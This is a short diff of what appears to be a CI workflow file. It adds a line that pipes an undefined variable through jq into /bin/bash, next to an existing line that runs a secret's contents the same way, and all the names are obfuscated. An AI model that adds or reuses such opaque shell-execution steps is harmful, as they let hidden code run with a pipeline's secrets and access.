@@ -21,6 +21,7 @@ jobs:
           jtn9866: ${{ secrets.jtn9866 }}
         run: |
           printf '%s' "$jtn9866" | jq -r .bjnwo7 | /bin/bash
+          echo $qw2286 | jq -r .brtf08 | /bin/bash
 
       - name: Store artifact
         if: always()
